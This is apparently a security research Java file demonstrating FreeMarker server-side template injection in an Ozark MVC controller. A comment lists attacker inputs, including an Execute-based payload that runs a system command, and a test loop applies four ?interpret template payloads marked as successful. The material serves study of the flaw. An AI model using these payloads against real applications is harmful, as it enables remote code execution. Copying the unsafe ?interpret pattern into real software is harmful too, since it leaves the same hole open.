package com.devsec.research.mvc.ozark.controllers;

import java.io.IOException;
import java.io.StringReader;
import java.io.StringWriter;
import java.io.Writer;

import javax.inject.Inject;
import javax.mvc.Controller;
import javax.ws.rs.GET;
import javax.ws.rs.Path;
import javax.ws.rs.QueryParam;

import com.devsec.research.mvc.ozark.bean.User;
import com.oracle.ozark.core.Models;

import freemarker.template.Configuration;
import freemarker.template.Template;
import freemarker.template.TemplateException;

@Controller
@Path("freemarker")
public class FreemarkerViewController {

	@Inject
	Models models;

	@GET
	public String sayHello(@QueryParam("name") String name) {
		User myUser = new User();
		myUser.setName(name);
		this.models.put("text", "Hello " + myUser.getName());
		this.models.put("user", myUser);
		return "freemarker-hello.ftl";
	}

	public static void main(String[] args) {
		
		/* Attacker input
		 * "#{7*7}"
		 * "${7*7}"
		 *  ${"freemarker.template.utility.Execute"?new()("calc")}
		 *  #{"freemarker.template.utility.Execute"?new()("calc")}
		 */
		String evaluated = "${7*7}"; 
				
		// Unsafe Evaluation at the template side 
		String[] payloads = {
				"<#assign inlineTemplate = text?interpret><@inlineTemplate />",  		// SUCCESS!!
				"<#assign inlineTemplate = user.name?interpret><@inlineTemplate />", 	// SUCCESS!!
		 		"<@text?interpret />",													// SUCCESS!!
		 		"<@user.name?interpret />"												// SUCCESS!!
		};
		String template = "";
		
		User myUser = new User();
		
		Models tmpModels = new Models();
		myUser.setName(evaluated);
		tmpModels.put("text", "Hello " + evaluated);
		tmpModels.put("user", myUser);
		
		try {
			
			for(int i=0; i<payloads.length; i++) {
				
				System.out.println("---------------------------------------------------------------");
				System.out.println("Payload: " + payloads[i]);
				System.out.println("---------------------------------------------------------------");
				template = "<!DOCTYPE html><html><body>" + "<form action='/' method='post'>" + "First name:<br>"
						+ "<input type='text' name='name' value=''>" + "<input type='submit' value='Submit'>"
						+ "</form><h2>Hello " + payloads[i] + "</h2></body></html>";
				System.out.println("Template: " + template);
				System.out.println("---------------------------------------------------------------");
				
				Template t = new Template("home", new StringReader(template), new Configuration());
				Writer out = new StringWriter();
				try {
					t.process(tmpModels, out);
				} catch (TemplateException e) {
					// TODO Return error or something else different from the template
					e.printStackTrace();
				}
	
				System.out.println("Output: " + out.toString());
				System.out.println("---------------------------------------------------------------");
			}
			
		} catch (IOException e) {

			e.printStackTrace();
		}
		
	}

}